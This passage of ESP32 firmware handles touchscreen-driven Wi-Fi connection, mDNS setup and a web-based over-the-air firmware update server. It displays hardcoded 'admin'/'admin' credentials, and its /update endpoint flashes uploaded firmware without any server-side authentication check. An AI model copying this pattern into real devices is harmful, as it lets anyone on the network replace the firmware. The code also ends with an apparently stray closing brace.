  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(10, 30 + yshift);
  tft.println("Connecting Wi-Fi");
  WiFi.begin(selectedSSID, wifiPassword);
  int attempts = 0;
  while (WiFi.status() != WL_CONNECTED && attempts < 20) {
    if (ts.touched()) {
      TS_Point p = ts.getPoint();
      int16_t x = map(p.x, TS_MIN_X, TS_MAX_X, 0, SCREEN_WIDTH - 1);
      int16_t y = map(p.y, TS_MAX_Y, TS_MIN_Y, 0, SCREEN_HEIGHT - 1);
      if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
        WiFi.disconnect();
        drawMenu();
        return;
      }
      delay(200);
    }
    delay(500);
    attempts++;
  }
  if (WiFi.status() != WL_CONNECTED) {
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.setCursor(10, 40 + yshift);
    tft.println("X Wi-Fi failed!");
    tft.setCursor(10, 50 + yshift);
    tft.println("Touch to retry or Back");
    waitForTouch();
    TS_Point p = ts.getPoint();
    int16_t x = map(p.x, TS_MIN_X, TS_MAX_X, 0, SCREEN_WIDTH - 1);
    int16_t y = map(p.y, TS_MAX_Y, TS_MIN_Y, 0, SCREEN_HEIGHT - 1);
    if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
      WiFi.disconnect();
      drawMenu();
      return;
    }
    performWebOTAUpdate();
    return;
  }
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.setCursor(10, 40 + yshift);
  tft.println("Wi-Fi OK");
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(10, 50 + yshift);
  tft.print("IP: ");
  tft.println(WiFi.localIP());
  tft.setCursor(10, 70 + yshift);
  tft.println("URL: http://esp32.local");
  tft.setCursor(10, 80 + yshift);
  tft.println("User: admin");
  tft.setCursor(10, 90 + yshift);
  tft.println("Pass: admin");

  if (!MDNS.begin(host)) {
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.setCursor(10, 40 + yshift);
    tft.println("X mDNS failed!");
    tft.setCursor(10, 50 + yshift);
    tft.println("Touch to retry or Back");
    waitForTouch();
    TS_Point p = ts.getPoint();
    int16_t x = map(p.x, TS_MIN_X, TS_MAX_X, 0, SCREEN_WIDTH - 1);
    int16_t y = map(p.y, TS_MAX_Y, TS_MIN_Y, 0, SCREEN_HEIGHT - 1);
    if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
      WiFi.disconnect();
      drawMenu();
      return;
    }
    performWebOTAUpdate();
    return;
  }
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.setCursor(10, 110 + yshift);
  tft.println("mDNS OK");
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(10, 120 + yshift);
  tft.println("Web server ready!");
  tft.setCursor(10, 130 + yshift);
  tft.println("Access via browser");

  server.on("/", HTTP_GET, []() {
    server.sendHeader("Connection", "close");
    server.send(200, "text/html", loginIndex);
  });
  server.on("/serverIndex", HTTP_GET, []() {
    server.sendHeader("Connection", "close");
    server.send(200, "text/html", serverIndex);
  });
  server.on("/update", HTTP_POST, []() {
    server.sendHeader("Connection", "close");
    bool success = !Update.hasError();
    server.send(200, "text/plain", success ? "OK" : "FAIL");
    if (success) {
      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
      tft.setCursor(10, 10 + yshift);
      tft.setTextColor(TFT_GREEN, TFT_BLACK);
      tft.setTextSize(1);
      tft.println("Update OK!");
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.setCursor(10, 20 + yshift);
      tft.println("Rebooting...");
      delay(2000);
      ESP.restart();
    } else {
      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
      tft.setCursor(10, 10 + yshift);
      tft.setTextColor(TFT_RED, TFT_BLACK);
      tft.println("X Update Failed!");
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.setCursor(10, 20 + yshift);
      tft.println("Touch to retry or Back");
      drawTabBar("", false, "", false, "Back", false);
      waitForTouch();
      TS_Point p = ts.getPoint();
      int16_t x = map(p.x, TS_MIN_X, TS_MAX_X, 0, SCREEN_WIDTH - 1);
      int16_t y = map(p.y, TS_MAX_Y, TS_MIN_Y, 0, SCREEN_HEIGHT - 1);
      if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
        server.close();
        WiFi.disconnect();
        drawMenu();
        return;
      }
      performWebOTAUpdate();
    }
  }, [&inUpdate, &totalUploaded]() {
    HTTPUpload& upload = server.upload();
    if (upload.status == UPLOAD_FILE_START) {
      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
      tft.setCursor(10, 10 + yshift);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.setTextSize(1);
      tft.println("Web OTA Started...");
      drawTabBar("", false, "", false, "Back", true);
      totalUploaded = 0;
      inUpdate = true;
      if (!Update.begin(UPDATE_SIZE_UNKNOWN)) {
        Update.printError(Serial);
      }
    } else if (upload.status == UPLOAD_FILE_WRITE) {
      if (Update.write(upload.buf, upload.currentSize) != upload.currentSize) {
        Update.printError(Serial);
      }
      totalUploaded += upload.currentSize;
      int percent = (totalUploaded * 100) / (upload.totalSize ? upload.totalSize : 1000000);
      tft.setCursor(10, 30 + yshift);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.printf("Progress: %d%%\n", percent);
    } else if (upload.status == UPLOAD_FILE_END) {
      if (Update.end(true)) {
        Serial.printf("Update Success: %u\n", upload.totalSize);
      } else {
        Update.printError(Serial);
      }
      totalUploaded = 0;
      inUpdate = false;
    }
  });

  server.begin();

  while (true) {
    server.handleClient();
    if (ts.touched() && !inUpdate) {
      TS_Point p = ts.getPoint();
      int16_t x = map(p.x, TS_MIN_X, TS_MAX_X, 0, SCREEN_WIDTH - 1);
      int16_t y = map(p.y, TS_MAX_Y, TS_MIN_Y, 0, SCREEN_HEIGHT - 1);
      if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
        server.close();
        WiFi.disconnect();
        drawMenu();
        return;
      }
      delay(200);
    }
    delay(1);
  }
}


void updateSetup() {
  
  tft.fillScreen(TFT_BLACK);
  tft.drawLine(0, 19, 240, 19, TFT_WHITE);
  //tft.fillRect(0, 37, 240, 320, TFT_BLACK);

  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(0);

  setupTouchscreen();

  uiDrawn = false;

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, false);
  runUI();

  drawMenu();
}

void updateLoop() {

  tft.drawLine(0, 19, 240, 19, TFT_WHITE);

  updateStatusBar();
  runUI();

  if (ts.touched()) {
    TS_Point p = ts.getPoint();

    int16_t x = map(p.x, TS_MIN_X, TS_MAX_X, 0, SCREEN_WIDTH - 1);
    int16_t y = map(p.y, TS_MAX_Y, TS_MIN_Y, 0, SCREEN_HEIGHT - 1);

    if (x > BUTTON1_X && x < BUTTON1_X + BUTTON_WIDTH && y > BUTTON1_Y && y < BUTTON1_Y + BUTTON_HEIGHT) {
      performSDUpdate();
    }
    else if (x > BUTTON2_X && x < BUTTON2_X + BUTTON_WIDTH && y > BUTTON2_Y && y < BUTTON2_Y + BUTTON_HEIGHT) {
      performWebOTAUpdate();
    }
    delay(200);
    }
  }   
}
